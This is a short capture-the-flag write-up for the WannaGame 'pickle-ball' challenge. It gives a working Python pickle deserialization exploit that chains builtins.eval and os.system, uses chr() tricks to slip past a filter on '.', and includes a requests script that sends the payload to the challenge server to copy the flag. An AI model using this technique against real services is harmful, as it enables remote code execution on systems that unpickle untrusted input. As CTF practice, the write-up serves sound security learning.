# WannaGame Championship

## pickle-ball

> https://cnsc.com.vn/ctf/challenges#Pickleball-52

## Approach

The final target is execute `os.system("cp ../flag static")`, so try:

```python
import pickle

# target: cp ../flag static
payload = b'''\
(S'f"cp {chr(46)*2+chr(47)}flag stati{chr(99)}"'
ibuiltins
eval
.'''

print(pickle.loads(payload))
```

Note that `.` in the payload is filtered, so when exploiting, remove the final `.`. Although this will cause a deserialization error on the server, the code will have already been executed.

```python
import requests
import base64

url = "http://ee4f2d3e42fc3c7c9d846f27e8217392.chall.w1playground.com:8082"

payload = b'''\
(\
(S'f"cp {chr(46)*2+chr(47)}flag stati{chr(99)}"'
ibuiltins
eval
ios
system
'''
payload = base64.b64encode(payload)

with requests.Session() as session:
    session.post(url + "/register", data={"username": "1", "password": "1"})
    session.post(url + "/login", data={"username": "1", "password": "1"})
    resp = session.post(url + "/process", data={"payload": payload})
    print(resp.text)
```

## Flag

Then download the flag at `/static/flag`.
